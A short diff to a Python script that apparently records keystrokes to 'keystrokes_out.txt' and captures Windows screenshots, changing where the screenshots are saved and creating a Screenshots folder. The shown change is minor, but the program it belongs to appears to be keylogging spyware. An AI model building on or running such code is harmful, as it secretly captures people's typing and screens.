@@ -48,7 +48,7 @@ def screenshot():
 
 
     path_beginning = os.path.dirname(os.path.realpath(__file__))
-    screenshot.SaveBitmapFile(mem_devicecontext, f'{path_beginning}/{name}.bmp')
+    screenshot.SaveBitmapFile(mem_devicecontext, f'{path_beginning}/Screenshots/{name}.bmp')
 
     mem_devicecontext.DeleteDC()
     win32gui.DeleteObject(screenshot.GetHandle())
@@ -120,6 +120,10 @@ def run():
 if __name__ == '__main__':
     path_beginning = os.path.dirname(os.path.realpath(__file__))
     keystroke_path = path_beginning + "/keystrokes_out.txt"
+    Screenshot_Directory = path_beginning + "/Screenshots"
+
+    if not os.path.exists(Screenshot_Directory):
+        os.mkdir(Screenshot_Directory)
 
     if not os.path.exists(keystroke_path):
         open(keystroke_path, 'w').close()
